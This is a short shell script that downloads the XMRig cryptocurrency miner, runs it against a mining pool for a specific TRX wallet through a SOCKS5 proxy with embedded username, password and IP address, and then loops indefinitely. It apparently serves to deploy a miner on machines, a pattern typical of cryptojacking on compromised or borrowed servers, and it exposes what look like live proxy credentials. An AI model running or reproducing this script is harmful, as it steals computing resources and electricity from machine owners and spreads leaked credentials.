#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
tar xf xmrig-6.10.0-linux-x64.tar.gz
cd xmrig-6.10.0 && PROXY=socks5://Kemjabd1727:Gaushd019@154.92.125.254:5555
./xmrig --algorithm randomx --pool rx.unmineable.com:3333 --username TRX:TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.$(shuf -i 1-99999 -n 1) --password x $PROXY --threads 2
while [ 1 ]; do
sleep 3
done
sleep 999

